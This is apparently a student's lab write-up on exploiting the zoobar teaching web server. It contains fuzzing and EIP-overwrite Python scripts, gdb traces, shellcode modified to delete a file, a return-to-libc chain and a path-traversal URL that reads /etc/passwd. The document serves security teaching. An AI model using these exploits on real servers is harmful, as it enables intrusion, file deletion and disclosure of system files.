##Buffer overflows

### Exercise 1

I first started to look for any vulnerable functions within the program that are known to be vulnerable to buffer overflows. OWASP states the following: "C library functions such as strcpy (), strcat (), sprintf () and vsprintf () operate on null terminated strings and perform no bounds checking." So these particular functions were the ones I was interested in if they were being used by the program.

[http.c:165] 
The program allocates 8192 bytes for the variable 'buf' and 512 bytes for the variable 'envvar'. The envvar variable can be overwritten by the sprintf function, because it does not perform any bounds checking for the buffer size.

    static char buf[8192];   // Here the program allocates the 8192 bytes for the variable 'buf'
    char envvar[512]; // Here it allocates 512 bytes for the variable 'envvar'
    ...
    ...
    ...
    sprintf(envvar, "HTTP_%s", buf); // Here sprintf will copy the content of envvar to buf

If the input exceeds the 512 byte limit it will overflow the buffer and we as an attacker will have control of the execution of the program. There are also other functions that does not perform bound checking and are prone to buffer overflow related attacks. 

For example, as an attack payload we can send the following HTTP Request that will overflow the buffer with a malicious HTTP header:

    GET / HTTP/1.1
    Host: 192.168.239.153
    HTTP_BBBBBBBBBBBB.......BBBBBBBB: foo
    Connection: Close

------

[http.c:282]
In the 'http_serve' function the program allocates 1024 bytes for a variable 'pn'. Then it uses the vulnerable 'strcat' function that does not perform bounds checking when concatenating to destination 'name'.

    void http_serve(int fd, const char *name)
    {
    void (*handler)(int, const char *) = http_serve_none;
    char pn[1024];
    struct stat st;

    getcwd(pn, sizeof(pn));
    setenv("DOCUMENT_ROOT", pn, 1);

    strcat(pn, name); // Here it uses the strcat function to append a copy of the source string to the destination variable 'name'

If we as an attacker provide more than the allocated 1024 bytes in the buffer for the 'pn' variable we can overflow the buffer.

------

[http.c:344]
In the 'dir_join' function the program uses another vulnerable function - strcpy, which does not check buffer lengths and just copies given input into the buffer.

    strcpy(dst, dirname); // Here the program uses strcpy function to copy the 'dst' variable input into 'dirname' variable

------

[http.c:347]
In the 'dir_join' function the program also uses 'strcat', which does not check buffer lengths and just concatenates user input as is.

    strcat(dst, filename); // Here the program uses strcat function to copy the 'dst' variable input into 'filename' variable

------

### Exercise 2
#### First vulnerability

    [http.c:282] The program allocates 1024 bytes for a variable 'pn'. 
    Then it uses the vulnerable 'strcat' function to append a string 
    from 'pn' to 'name' variable.
    
Our goal is to find out a request that could crash the server and
after that, to exploit it further to gain control of the control flow.

The server does pretty good job filtering any non-HTTP requests out,
so we have to have the default HTTP-query included in the exploit:

    GET / HTTP/1.1\r\nHost: "+ HOSTNAME + "\r\nConnection: Close\r\n\r\n"
    
The command above just gets the index page and does nothing else.

Next step were to find out how much data can the server handle including
the HTTP-request. We did this by using a python script to generate HTTP-requests
of increasing length:

    # Fuzzed HTTP Requests trying to find
    # the maximum size that the server
    # can handle
    
    import sys, socket, time
    
    # Use in the form "python httpfuzz.py host port"
    
    host = sys.argv[1] # Recieve IP from user
    port = int(sys.argv[2]) # Recieve Port from user
    
    length = 100 # Initial length of 100 A's
    
    while (length < 3000): # Stop once we've tried up to 3000 length
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Declare a TCP socket
        client.connect((host, port)) # Connect to user supplied port and IP address
    
        command = "GET /" +  length * "A" + " HTTP/1.1\r\nHost: "+ host + "\r\nConnection: Close\r\n\r\n"
        client.send(command) # Send the user command with a variable length name
        data = client.recv(1024) # Recieve Reply
        client.close() # Close the Connection
        time.sleep(2)
        print "Length Sent: " + str(length) # Output length of the request
        length += 100 # Try again with an increased length

Seems that the server crashes when 2000 characters had been added to the
initial HTTP-request, the whole length of the crashing request was 2051:

    Length Sent: 2000
    Traceback (most recent call last):
      File "httpfuzz.py", line 21, in <module>
        data = client.recv(1024) # Recieve Reply
    socket.error: [Errno 54] Connection reset by peer

After the first crash, we used metasploit's pattern creator to create a
pattern which helps to find out where the buffer overflow happens:

    ruby /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2000
    
    
    # Uses a generated pattern to get better
    # understanding when the server crashes
    
    import sys, socket
    
    # Use in the form "python httppattern.py host port"
    
    host = sys.argv[1] # Recieve IP from user
    port = int(sys.argv[2]) # Recieve Port from user
    
    
    pattern = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co"
    
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Declare a TCP socket
    client.connect((host, port)) # Connect to user supplied port and IP address
    
    command = "GET /" +  pattern + " HTTP/1.1\r\nHost: "+ host + "\r\nConnection: Close\r\n\r\n"
    client.send(command) # Send the command 
    data = client.recv(1024) # Recieve Reply
    client.close() # Close the Connection

Before running the script, we started gdb on the server to debug the process:

    $ gdb -p $(pgrep zookfs-exstack) 
    (gdb) b http_serve
    Breakpoint 1 at 0x804951c: file http.c, line 275.
    (gdb) c
    Continuing.
    [New process 1164]
    [Switching to process 1164]
    Breakpoint 1, http_serve (fd=3, 
    name=0x80510b4 "/Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5A"...) at http.c:275
    275	    void (*handler)(int, const char *) = http_serve_none;
    (gdb) n
    279	    getcwd(pn, sizeof(pn));
    (gdb) n
    280	    setenv("DOCUMENT_ROOT", pn, 1);
    (gdb) n
    282	    strcat(pn, name);
    (gdb) n
    283	    split_path(pn);
    (gdb) n
    285	    if (!stat(pn, &st))
    (gdb) n
    296	    handler(fd, pn);
    (gdb) n
    
    Program received signal SIGSEGV, Segmentation fault.
    0x42366842 in ?? ()
    (gdb) infor reg
    Undefined command: "infor".  Try "help".
    (gdb) info reg
    eax            0x42366842	1110861890
    ecx            0x401d5940	1075665216
    edx            0xffffffbc	-68
    ebx            0x401d1000	1075646464
    esp            0xbfffd98c	0xbfffd98c
    ebp            0xbfffde08	0xbfffde08
    esi            0x0	0
    edi            0x0	0
    eip            0x42366842	0x42366842
    eflags         0x10286	[ PF SF IF RF ]
    cs             0x73	115
    ss             0x7b	123
    ds             0x7b	123
    es             0x7b	123
    fs             0x0	0
    gs             0x33	51
    (gdb) 
    
After checking the crash with gdb, we got confirmation that we were able
to access $eip, which contains the address of the next instruction. To
get the exact position of the overflow to $eip, we used once more metasploit's
scripts to check the pattern offset:

    # ruby /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 42366842
    [*] Exact match at offset 1008

This means that we have to add 1008 characters of padding in our request
followed by the desired address for $eip:

    # Overrides eip with eipaddr
    
    import sys, socket, time
    
    # Use in the form "python httpeipovr.py  "
    
    host = sys.argv[1] # Recieve IP from user
    port = int(sys.argv[2]) # Recieve Port from user
    
    eipaddr = "\xEF\xBE\xAD\xDE"
    pattern = "A" * 1008 + eipaddr
    
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Declare a TCP socket
    client.connect((host, port)) # Connect to user supplied port and IP address
    
    command = "GET /" +  pattern  + " HTTP/1.1\r\nHost: "+ host + "\r\nConnection: Close\r\n\r\n"
    client.send(command) # Send the command
    
    data = client.recv(1024) # Recieve Reply
    
    client.close() # Close the Connection
    
We got the following information about the crash when debugging with gdb:

    Program received signal SIGSEGV, Segmentation fault.
    0xdeadbeef in ?? ()
    (gdb) info reg
    eax            0xdeadbeef	-559038737
    ecx            0x401d5940	1075665216
    edx            0xffffffbc	-68
    ebx            0x401d1000	1075646464
    esp            0xbfffd98c	0xbfffd98c
    ebp            0xbfffde08	0xbfffde08
    esi            0x0	0
    edi            0x0	0
    eip            0xdeadbeef	0xdeadbeef
    eflags         0x10286	[ PF SF IF RF ]
    cs             0x73	115
    ss             0x7b	123
    ds             0x7b	123
    es             0x7b	123
    fs             0x0	0
    gs             0x33	51
    (gdb) 

This means that we can add anything we want to $eip.
The full exploit code can be found from the [exploit-1.py](https://github.com/ukk1/ITKST53/blob/master/Lab1/exploit-1.py) file.

---
#### Second vulnerability
For the second vulnerability we chose to exploit was how the zoobar HTTP server handles HTTP requests headers. If we as an attacker create an arbitrary header that exceeds the 'envvar' variable 512 bytes, we successfully corrupt the memory of the zoobar process.

    # Fuzzed HTTP Requests trying to find
    # the maximum size that the server
    # can handle

    import sys, socket, time
    
    # Use in the form "python httpfuzz.py host port"

    host = sys.argv[1] # Recieve IP from user
    port = int(sys.argv[2]) # Recieve Port from user

    length = 100 # Initial length of 100 A's

    while (length < 3000): # Stop once we've tried up to 3000 length
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Declare a TCP socket
        client.connect((host, port)) # Connect to user supplied port and IP address

        command = "GET / HTTP/1.1\r\nHost: " + host + "HTTP_" + length * "C" + ": foo" + "\r\nConnection: Close\r\n\r\n"
        client.send(command) # Send the user command with a variable length name
        data = client.recv(1024) # Recieve Reply
        client.close() # Close the Connection
        time.sleep(2)
        print "Length Sent: " + str(length) # Output length of the request
        length += 100 # Try again with an increased length

The memory corruption happens after we have sent little over 500 bytes:

    Length Sent: 500
    Traceback (most recent call last):
      File "fuzzer.py", line 20, in <module>
        data = client.recv(1024) # Recieve Reply
    socket.error: [Errno 54] Connection reset by peer

If we look at the status of dmesg, we can see the following:

    vm-6858 kernel: [  232.463970] zookfs-exstack[976]: segfault at 43434343 ip 43434343 sp bfffde10 error 14

    0x43434343 in ?? ()
    (gdb) info reg
    eax            0x804a147	134521159
    ecx            0x401d58fc	1075665148
    edx            0x1	1
    ebx            0x43434343	1128481603
    esp            0xbfffde10	0xbfffde10
    ebp            0x43434343	0x43434343
    esi            0x0	0
    edi            0x0	0
    eip            0x43434343	0x43434343
    eflags         0x10282	[ SF IF RF ]
    cs             0x73	115
    ss             0x7b	123
    ds             0x7b	123
    es             0x7b	123
    fs             0x0	0
    gs             0x33	51
    
The full exploit code can be found from the [exploit-2a.py](https://github.com/ukk1/ITKST53/blob/master/Lab1/exploit-2a.py) file. It will overwrite the return address and inject the modified shellcode that will unlink the grades.txt file.

#### Stack canaries

Linux systems has a protection mechanism against buffer overflow attacks, known as canaries. The idea behind a stack canary is to place a 4-byte value onto the stack after the buffer and before the return pointer. The point in the canary is that if we as an attacker overflow the buffer and the canary value is not the same upon function completion as when it was pushed onto the stack, a function is called to terminate the process.

There are three main types of canaries:
######Terminator canary
    0x00000aff & 0x000aff0d
######Random canary
    random 4-byte value protected in memory
######Null canary
    0x00000000

The idea behind a terminator canary is to cause string operations to terminate when trying to overwrite the buffer and return pointer. It is possible for an attacker to place same value in the attack payload that will overwrite the terminator canary value and pass as valid.

Random canary is more preferred method over terminator canary. It is a randomly generated 4-byte value placed onto the stack. It is important to use enough entropy when generating random 4-byte values as otherwise it can be possible for an attacker to brute force the canary value.

Null canary is the weakest option of the three. The canary is a 4-byte value containing all 0s, this is very trivial for an attacker to bypass.

------
###Exercise 3

######Mofidied Aleph One shellcode to unlink /home/httpd/grades.txt

For the buffer overflow exploit we were required to modify the Aleph One's shellcode in a way that it will use the Linux syscall unlink that will remove the /home/httpd/grades.txt file from the machine. Below we have provided the modified shellcode.S file to achieve this goal:

    #include <sys/syscall.h>

    #define STRING	"/home/httpd/grades.txt" /* Provide the filepath to the grades.txt file */
    #define STRLEN	22 /* Length of the string for the target file */
    #define ARGV	(STRLEN+1)
    #define ENVP	(ARGV+4)

    .globl main
    	.type	main, @function

     main:
    	jmp	calladdr

     popladdr:
    	popl	%esi
    	movl	%esi,(ARGV)(%esi)	/* set up argv pointer to pathname */
    	xorl	%eax,%eax		/* get a 32-bit zero value */
    	movb	%al,(STRLEN)(%esi)	/* null-terminate our string */
    	movl	%eax,(ENVP)(%esi)	/* set up null envp */

    	add     $5, %al         /* add 5 low bytes to avoid the unlink syscall, is 10 or '\n' (newline) */
        add     $5, %al         /* add 5 low bytes to avoid the unlink syscall, is 10 or '\n' (newline) */
    	movl	%esi,%ebx		/* syscall arg 2: string pathname */
    	leal	ARGV(%esi),%ecx		/* syscall arg 2: argv */
    	leal	ENVP(%esi),%edx		/* syscall arg 3: envp */
    	int	$0x80			/* invoke syscall */

    	xorl	%ebx,%ebx		/* syscall arg 2: 0 */
    	movl	%ebx,%eax
    	inc	%eax			/* syscall arg 1: SYS_exit (1), uses */
        					/* mov+inc to avoid null byte */
    	int	$0x80			/* invoke syscall */

     calladdr:
    	call	popladdr
    	.ascii	STRING

We modified the STRING and STRLEN values to match the file path of the grades.txt and the length of the string. There was also an issue that if we used the unlink syscall directly it would be interpreted as a newline or \n, which would break the HTTP request that we would send to the Zoobar HTTP Server. We got around this by adding two times 5 bytes into lower bytes to get the unlink syscall.

The new shellcode can be created as follows:

    httpd@vm-6858:~/lab$ make shellcode.S shellcode.bin
    
The final exploit code for this exercise can be found in the [exploit-3.py](https://github.com/ukk1/ITKST53/blob/master/Lab1/exploit-3.py) file.

------

###Exercise 4

In the return to libc exercise we used the following technique to achieve the goal to unlink the grades.txt file:

The idea was to use a system function call that we are using to execute our own, custom environment variable that will be used to unlink the grades.txt file.

First, we locate the system function call address from gdb while we are attached to the zoobar process.

    (gdb) p system
    $1 = {<text variable, no debug info>} 0xb7e6b100 <__libc_system>
    
The printed address is the one we will be using in our exploit in the RET call. After this, we will use the exit() function to terminate the program gracefully.

    (gdb) p exit
    $2 = {<text variable, no debug info>} 0xb7e5e150 <__GI_exit>

Next, we create the environment variable that we will be using in our exploit. 

    export RM="unlink /home/httpd/grades.txt"
    
Now we need to locate the environment variable address in the memory. We used a script provided by here http://www.infosecwriters.com/text_resources/pdf/return-to-libc.pdf.

    httpd@vm-6858:~/lab$ ./getenv RM
    RM is stored at address 0xbffff8ca
    
It is important to note that the environment variable we create is only good in the shell under which it is created. If we try to search the variable in another shell, we get an error:

    httpd@vm-6858:~/lab$ ./getenv RM
    Environmental variable RM does not exist!

The memory address of the environment variable is not always the exact address and usually it is necessary to deduce the environment variable address:

    zookd-nxstack: [2352] Request failed: Error forwarding request: /AAAAAA.....snip....AAAAAAAA
    [New process 2361]
    process 2361 is executing new program: /bin/dash
    sh: 1: k: not found
    zookfs-nxstack: recvfd: Success
    [Inferior 2 (process 2361) exited with code 0177]

By counting backwards 5 bytes, we get the correct address, which is 0xbffff8c5. After modifying our exploit with the correct address we successfully unlink the grades.txt file.

    [New process 2458]
    process 2458 is executing new program: /bin/dash
    [New process 2459]
    process 2459 is executing new program: /usr/bin/unlink
    zookfs-nxstack: recvfd: Success
    [Inferior 3 (process 2459) exited normally]
    
When we use the exit() function the program will terminate gracefully and will not leave any marks in the system that would show any possible arbitrary use. If we would use some random bytes for padding, when the program terminates it would leave information for the sysadmin in the logs:

    Jun 29 12:59:12 vm-6858 kernel: [ 8325.355822] zookd-nxstack[2365]: segfault at 4b434148 ip 4b434148 sp bfffee34 error 14
    
The final layout looks like this:

     AAAAAAAAAAAAAA   0xb7e6b100     0xb7e5e150     0xbffff8c5
    |--------------|--------------|--------------|--------------|
         buffer         system()       exit()         RM env
         
The exploits for this exercise can be found from [exploit-4a.py](https://github.com/ukk1/ITKST53/blob/master/Lab1/exploit-4a.py) and [exploit-4b.py](https://github.com/ukk1/ITKST53/blob/master/Lab1/exploit-4b.py) files. They use different techniques, the exploit-4a.py uses the unlink system call and locates the /home/httpd/grades.txt string from the buffer. The exploit-4b.py uses an environment variable and system() function call, which executes the following environment variable "unlink /home/httpd/grades.txt"

--------

###Exercise 5

There is a local file inclusion vulnerability, which allows us to read files from the zoobar web directory. This vulnerability allows us to go through the source code of the python scripts from the server or other sensitive files, such as passwd. This vulnerability presents a clear security risk since it exposes sensitive configuration files and source code to users.

The web server should have some sort of Access Control List (ACL) in place that checks and validates if users have access or permissions to run specific files in the environment.

    [http.c:301]
    void http_serve_none(int fd, const char *pn)
    {
        http_err(fd, 404, "File does not exist: %s", pn);
    }

    http://192.168.239.153:8080/zoobar/../../../../../../../../../../../../../../../../etc/passwd%00index.cgi/

    HTTP/1.0 200 OK
    Content-Type: text/html

    root:x:0:0:root:/root:/bin/bash
    ...snip...
    sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin
    colord:x:104:110:colord colour management daemon,,,:/var/lib/colord:/bin/false
    httpd:x:1000:1000:Ubuntu,,,:/home/httpd:/bin/bash
